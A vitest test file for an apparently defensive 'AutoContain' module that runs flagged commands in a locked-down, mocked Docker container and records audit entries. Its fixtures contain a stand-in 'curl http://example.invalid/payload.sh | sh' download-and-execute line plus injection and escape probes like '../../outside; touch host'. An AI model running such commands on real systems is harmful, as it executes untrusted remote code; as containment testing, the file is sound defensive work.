import { randomUUID } from "node:crypto";
import { EventEmitter } from "node:events";
import { readFile } from "node:fs/promises";
import { join, resolve } from "node:path";
import { PassThrough } from "node:stream";
import { beforeEach, describe, expect, it, vi } from "vitest";

const spawnMock = vi.hoisted(() => vi.fn());

vi.mock("node:child_process", () => ({
	spawn: spawnMock,
}));

import { AutoContain, type ContainConfig } from "../contain.js";
import { ResponseAuditor } from "../response-audit.js";
import type { Verdict } from "../types.js";
import { makeTmpDir } from "./test-utils.js";

type SpawnCall = {
	command: string;
	args: string[];
	options: Record<string, unknown>;
};

type MockProcess = EventEmitter & {
	stdout: PassThrough;
	stderr: PassThrough;
	stdin: PassThrough;
	kill: ReturnType<typeof vi.fn>;
};

function testVerdict(): Verdict {
	return {
		decision: "deny",
		category: "command",
		confidence: 0.98,
		severity: "critical",
		source: "test",
		artifacts: ["curl http://example.invalid/payload.sh | sh"],
		matchedThreatId: "TEST-CONTAIN-001",
		reasons: ["test containment"],
	};
}

function containConfig(overrides: Partial<ContainConfig> = {}): ContainConfig {
	return {
		runtime: "docker",
		baseImage: "alpine:latest",
		networkMode: "none",
		readonlyMounts: [],
		timeoutSeconds: 5,
		...overrides,
	};
}

function createMockProcess(): MockProcess {
	const proc = new EventEmitter() as MockProcess;
	proc.stdout = new PassThrough();
	proc.stderr = new PassThrough();
	proc.stdin = new PassThrough();
	proc.kill = vi.fn();
	return proc;
}

function finish(proc: MockProcess, event: "exit" | "error", payload: number | Error): void {
	setImmediate(() => {
		if (event === "exit") {
			proc.emit("exit", payload);
			return;
		}
		proc.emit("error", payload);
	});
}

function mockContainerRuntime(
	handlers: Partial<{
		version: (proc: MockProcess, call: SpawnCall) => void;
		create: (proc: MockProcess, call: SpawnCall) => void;
		start: (proc: MockProcess, call: SpawnCall) => void;
		exec: (proc: MockProcess, call: SpawnCall) => void;
		rm: (proc: MockProcess, call: SpawnCall) => void;
	}> = {},
): SpawnCall[] {
	const calls: SpawnCall[] = [];
	spawnMock.mockImplementation(
		(command: string, args: string[], options: Record<string, unknown>) => {
			const proc = createMockProcess();
			const call = { command, args, options };
			calls.push(call);
			const runtimeHandlers: Record<
				string,
				((proc: MockProcess, call: SpawnCall) => void) | undefined
			> = {
				"--version": handlers.version,
				create: handlers.create,
				start: handlers.start,
				exec: handlers.exec,
				rm: handlers.rm,
			};
			const runtimeCommand = args[0] ?? "";
			const handler = runtimeHandlers[runtimeCommand];
			if (handler) {
				handler(proc, call);
			} else if (Object.hasOwn(runtimeHandlers, runtimeCommand)) {
				finish(proc, "exit", 0);
			} else {
				finish(proc, "error", new Error(`unexpected spawn: ${command} ${args.join(" ")}`));
			}

			return proc;
		},
	);
	return calls;
}

async function readAuditEntries(path: string): Promise<Array<Record<string, unknown>>> {
	const raw = await readFile(path, "utf8");
	return raw
		.trim()
		.split("\n")
		.filter(Boolean)
		.map((line) => JSON.parse(line) as Record<string, unknown>);
}

describe("AutoContain containment regressions", () => {
	beforeEach(() => {
		spawnMock.mockReset();
	});

	it("fail-closes command containment when runtime is unavailable and writes failure audit evidence", async () => {
		const tmpDir = await makeTmpDir();
		const auditLogPath = join(tmpDir, "response-audit.jsonl");
		const auditor = new ResponseAuditor(auditLogPath);
		const warn = vi.fn();
		spawnMock.mockImplementation(
			(command: string, args: string[], options: Record<string, unknown>) => {
				const proc = createMockProcess();
				expect(command).toBe("docker");
				expect(args).toEqual(["--version"]);
				expect(options).toMatchObject({ shell: false });
				finish(proc, "error", new Error("not installed"));
				return proc;
			},
		);

		const contain = new AutoContain(
			containConfig(),
			{ debug: vi.fn(), info: vi.fn(), warn, error: vi.fn() },
			auditor,
		);

		const result = await contain.isolateCommand("sh", ["-c", "touch /host/owned"], {
			verdict: testVerdict(),
			threatId: "TEST-CONTAIN-001",
		});

		expect(result).toMatchObject({
			success: false,
			exitCode: -1,
			stdout: "",
			isolated: false,
		});
		expect(result.stderr).toContain("not available");
		expect(spawnMock).toHaveBeenCalledTimes(1);
		expect(warn).toHaveBeenCalledWith(
			"Container runtime not available, refusing to run command",
			expect.objectContaining({ runtime: "docker", command: "sh" }),
		);

		const entries = await readAuditEntries(auditLogPath);
		expect(entries).toHaveLength(1);
		expect(entries[0]).toMatchObject({
			action: "contain",
			threat_id: "TEST-CONTAIN-001",
			tool: "sh",
			input: "-c touch /host/owned",
			response_taken: "contain",
			metadata: {},
			outcome: "failure",
			error: "Container runtime not available",
		});
	});

	it("selects hardened container create options and passes command input as argv, not shell text", async () => {
		const mountPath = resolve("packages/core/src/__tests__");
		const calls = mockContainerRuntime({
			exec: (proc) => {
				proc.stdout.write("contained\n");
				proc.stderr.write("diagnostic\n");
				finish(proc, "exit", 0);
			},
		});
		const contain = new AutoContain(
			containConfig({
				networkMode: "restricted",
				readonlyMounts: [mountPath],
				cpuLimit: "0.5",
				memoryLimit: "64m",
			}),
		);

		const result = await contain.isolateCommand(
			"node",
			["-e", "console.log(process.argv[1])", "../../outside; touch host"],
			{
				workingDir: "/workspace",
				env: { TOKEN: "abc=123" },
				input: "stdin payload",
			},
		);

		expect(result).toMatchObject({
			success: true,
			exitCode: 0,
			stdout: "contained\n",
			stderr: "diagnostic\n",
			isolated: true,
		});
		expect(result.containerId).toMatch(/^aidr-[a-f0-9]{16}$/);
		expect(calls.map((call) => call.args[0])).toEqual([
			"--version",
			"create",
			"start",
			"exec",
			"rm",
		]);
		expect(calls.find((call) => call.args[0] === "start")?.args).toEqual([
			"start",
			result.containerId,
		]);

		const createCall = calls.find((call) => call.args[0] === "create");
		expect(createCall?.options).toMatchObject({ shell: false });
		expect(createCall?.args).toEqual(
			expect.arrayContaining([
				"create",
				"--rm",
				"--network",
				"none",
				"--read-only",
				"--cpus",
				"0.5",
				"--memory",
				"64m",
				"--security-opt",
				"no-new-privileges:true",
				"--cap-drop",
				"ALL",
				"-v",
				`${mountPath}:${mountPath}:ro`,
				"alpine:latest",
				"sleep",
				"10",
			]),
		);

		const execCall = calls.find((call) => call.args[0] === "exec");
		expect(execCall?.options).toMatchObject({ shell: false });
		expect(execCall?.args).toEqual([
			"exec",
			"-i",
			"-w",
			"/workspace",
			"-e",
			"TOKEN=abc=123",
			result.containerId,
			"node",
			"-e",
			"console.log(process.argv[1])",
			"../../outside; touch host",
		]);

		expect(calls.at(-1)?.args).toEqual(["rm", "-f", result.containerId]);
	});

	it("removes a created container when startup fails", async () => {
		const calls = mockContainerRuntime({
			start: (proc) => {
				proc.stderr.write("daemon refused start");
				finish(proc, "exit", 1);
			},
		});
		const contain = new AutoContain(containConfig());

		await expect(contain.isolateCommand("aidr-tool", ["scan"])).rejects.toThrow(
			"Failed to start container: daemon refused start",
		);
		expect(calls.map((call) => call.args[0])).toEqual(["--version", "create", "start", "rm"]);
	});

	it("records nonzero command exits as containment failures", async () => {
		const tmpDir = await makeTmpDir();
		const auditLogPath = join(tmpDir, `response-audit-${randomUUID()}.jsonl`);
		const auditor = new ResponseAuditor(auditLogPath);
		mockContainerRuntime({
			exec: (proc) => {
				proc.stderr.write("command rejected");
				finish(proc, "exit", 7);
			},
		});
		const contain = new AutoContain(containConfig(), undefined, auditor);

		const result = await contain.isolateCommand("aidr-tool", ["scan"], {
			verdict: testVerdict(),
			threatId: "TEST-CONTAIN-001",
		});

		expect(result).toMatchObject({ success: false, exitCode: 7, isolated: true });
		const [entry] = await readAuditEntries(auditLogPath);
		expect(entry).toMatchObject({ outcome: "failure", error: "command rejected" });
	});

	it("destroys the container when command execution fails before an exit code", async () => {
		const calls = mockContainerRuntime({
			exec: (proc) => finish(proc, "error", new Error("exec spawn failed")),
		});
		const contain = new AutoContain(containConfig());

		await expect(contain.isolateCommand("aidr-tool", ["scan"])).rejects.toThrow(
			"Failed to execute in container: exec spawn failed",
		);

		const createCall = calls.find((call) => call.args[0] === "create");
		const createdContainerId = createCall?.args[createCall.args.indexOf("--name") + 1];
		expect(createdContainerId).toMatch(/^aidr-[a-f0-9]{16}$/);
		expect(calls.some((call) => call.args[0] === "rm" && call.args[2] === createdContainerId)).toBe(
			true,
		);
	});

	it("writes one success audit event per isolated command attempt", async () => {
		const tmpDir = await makeTmpDir();
		const auditLogPath = join(tmpDir, `response-audit-${randomUUID()}.jsonl`);
		const auditor = new ResponseAuditor(auditLogPath);
		mockContainerRuntime();
		const contain = new AutoContain(containConfig(), undefined, auditor);

		await contain.isolateCommand("echo", ["one"], {
			verdict: testVerdict(),
			threatId: "TEST-CONTAIN-001",
		});
		await contain.isolateCommand("echo", ["one"], {
			verdict: testVerdict(),
			threatId: "TEST-CONTAIN-001",
		});

		const entries = await readAuditEntries(auditLogPath);
		expect(entries).toHaveLength(2);
		expect(entries.map((entry) => entry.outcome)).toEqual(["success", "success"]);
		expect(entries.map((entry) => entry.input)).toEqual(["one", "one"]);
		expect(entries[0]?.id).not.toBe(entries[1]?.id);
		expect(entries[0]?.metadata).toMatchObject({ containerId: expect.stringMatching(/^aidr-/) });
		expect(entries[0]?.metadata).not.toEqual(entries[1]?.metadata);
	});
});
